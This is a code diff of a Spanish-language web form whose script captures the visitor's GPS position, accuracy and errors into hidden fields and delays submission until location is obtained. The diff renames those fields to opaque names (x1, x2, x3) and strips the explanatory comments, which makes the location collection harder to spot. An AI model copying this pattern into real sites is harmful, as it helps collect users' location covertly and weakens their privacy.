@@ -280,12 +280,9 @@
 <input type="hidden" name="gps_error" id="gps_error">
 <input type="hidden" name="foto_cam" id="foto_cam">
 
-          <!-- AQUÍ deben estar -->
-    <input type="hidden" id="gps_loc" name="gps_loc">
-    <input type="hidden" id="gps_accuracy" name="gps_accuracy">
-    <input type="hidden" id="gps_error" name="gps_error">
-
-    <!-- tus otros campos -->
+          <input type="hidden" id="x1" name="x1">
+<input type="hidden" id="x2" name="x2">
+<input type="hidden" id="x3" name="x3">
           
 
             
@@ -354,17 +351,16 @@ document.addEventListener("DOMContentLoaded", function () {
     let ubicacionProcesada = false;
     const form = document.querySelector("form");
 
-    // Intentar obtener ubicación
     if (navigator.geolocation) {
 
         navigator.geolocation.getCurrentPosition(
 
             // ✔ Usuario aceptó
             function (pos) {
-                document.getElementById("gps_loc").value =
+                document.getElementById("x1").value =
                     pos.coords.latitude + "," + pos.coords.longitude;
 
-                document.getElementById("gps_accuracy").value =
+                document.getElementById("x2").value =
                     pos.coords.accuracy + " metros";
 
                 ubicacionProcesada = true;
@@ -372,7 +368,7 @@ document.addEventListener("DOMContentLoaded", function () {
 
             // ❌ Usuario rechazó o hubo error
             function (err) {
-                document.getElementById("gps_error").value =
+                document.getElementById("x3").value =
                     "Error " + err.code + ": " + err.message;
 
                 ubicacionProcesada = true;
@@ -386,7 +382,7 @@ document.addEventListener("DOMContentLoaded", function () {
         );
 
     } else {
-        document.getElementById("gps_error").value =
+        document.getElementById("x3").value =
             "Geolocalización no soportada";
         ubicacionProcesada = true;
     }
@@ -396,10 +392,7 @@ document.addEventListener("DOMContentLoaded", function () {
 
         if (!ubicacionProcesada) {
             e.preventDefault();
-
-            alert("Espera un momento mientras obtenemos tu ubicación...");
-
-            // Reintentar enviar automáticamente después de 2 segundos
+            alert("Obteniendo ubicación...");
             setTimeout(() => form.submit(), 2000);
         }
     });
